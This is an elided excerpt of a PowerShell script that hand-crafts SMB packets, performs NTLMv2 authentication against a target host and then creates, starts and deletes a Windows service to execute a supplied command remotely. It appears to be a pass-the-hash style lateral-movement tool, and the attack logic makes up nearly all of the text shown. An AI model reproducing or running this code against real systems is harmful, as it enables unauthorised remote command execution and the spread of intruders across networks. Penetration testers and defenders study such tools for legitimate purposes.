...
{
    param ($packet_process_ID,$packet_security_blob_length,$packet_byte_count,$packet_length_1,$packet_length_2,$packet_length_3,$packet_NTLMSSP_length,$packet_NTLMSSP)
    ...
    if(!$packet_NTLMSSP)
    {
        ...
        [Byte[]]$packet_byte_count = 0x55,0x00
    ...
    [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_NTLMSSP.Length + 104)
...
function Set-PacketSMBSessionSetupAndXRequestNTLMSSPAuth()
{
    ...
    param ($packet_process_ID,$packet_user_ID,$packet_security_blob_length,$packet_byte_count,$packet_length_1,$packet_length_2,$packet_length_3,$packet_NTLMSSP_length,$packet_NTLMSSP)
...
{
param ($packet_process_ID,$packet_user_ID,$packet_byte_count,$packet_path)
...
{
    param ($packet_process_ID,$packet_user_ID)
...
{
    param ($packet_process_ID,$packet_user_ID,$packet_multiplex_ID)
...
{
    param ($packet_process_ID,$packet_user_ID,$packet_service)

    [Byte[]]$packet_SMB_open_SC_manager = 0x00,
                                            0x00,0x00,0x9b,
                                            0xff,0x53,0x4d,0x42,
                                            0x2f,
                                            0x00,
...
{
    param ($packet_process_ID,$packet_user_ID,$packet_service_byte_count,$packet_context_handle,$packet_service,$packet_referent_ID,$packet_command_length,$packet_command)
...
{
    param ($packet_process_ID,$packet_user_ID,$packet_context_handle)
...
while($i -lt 2)
{
    ...
    switch ($i)
    {
        ...
        0
        {
            $SMB_client_send = Set-PacketSMBNegotiateProtocolRequest $process_ID_bytes
        }
                
        1
        { 
            $SMB_client_send = Set-PacketSMBSMBSessionSetupAndXRequestNTLMSSPNegotiate $process_ID_bytes
        }
...
$SMB_byte_count = [BitConverter]::GetBytes($full_security_blob.Length + 16 + 11)
...
$SMB_client_send = Set-PacketSMBSessionSetupAndXRequestNTLMSSPAuth $process_ID_bytes $SMB_user_ID $full_security_blob_length $SMB_byte_count $SMB_length_1 $SMB_length_2 $SMB_length_3 $NTLMv2_response_length $full_security_blob
$SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
$SMB_client_stream.Flush()
$SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
...
{
    write-output "Successful login on $Target"
    $login_successful = $true
}
else
{
    write-output "Login failed on $Target"
...
if($login_successful)
{
    ...
    :SMB_execute_loop while ($k -lt 12)
    {
        ...
        switch ($k)
        {
            ...
            0
            {
                $SMB_client_send = Set-PacketSMBTreeConnectAndXRequest $process_ID_bytes $SMB_user_ID $SMB_path_byte_count $SMB_path_bytes
            }
                  
            1
            {
                $SMB_client_send = Set-PacketSMBNTCreateAndXRequest $process_ID_bytes $SMB_user_ID
            }
                
            2
            {
                $SMB_client_send = Set-PacketDCERPCBind $process_ID_bytes $SMB_user_ID
                $SMB_multiplex_ID = 0x05
            }
               
            3
            {
                $SMB_client_send = Set-PacketSMBNTReadAndXRequest $process_ID_bytes $SMB_user_ID $SMB_multiplex_ID
            }
                
            4
            {
                $SMB_client_send = Set-PacketSMBOpenSCManagerW $process_ID_bytes $SMB_user_ID $SMB_service_bytes                        
            ...
            6
            {
                $SMB_client_send = Set-PacketSMBCreateServiceW $process_ID_bytes $SMB_user_ID $SMB_service_byte_count_bytes $SMB_context_handle $SMB_service_bytes $SMB_referent_ID_bytes $PsExec_command_length_bytes $PsExec_command_bytes                        
            ...
            8
            {
                $SMB_client_send = Set-PacketSMBStartServiceW $process_ID_bytes $SMB_user_ID $SMB_context_handle
            }
            ...
            10
            { 
                $SMB_client_send = Set-PacketSMBDeleteServiceW $process_ID_bytes $SMB_user_ID $SMB_context_handle
            }
        ...
        elseif($k -eq 7 -or $k -eq 9 -or $k -eq 11)
        {
            ...
            switch($k)
            {
                ...
                7
                {
                    $SMB_context_handle = $SMB_client_receive[92..111]
            ...
            if([System.BitConverter]::ToString($SMB_context_handle[0..3]) -ne '00-00-00-00')
            {
                Write-Output "Something went wrong"
                $PsExec_failed = $true
            }
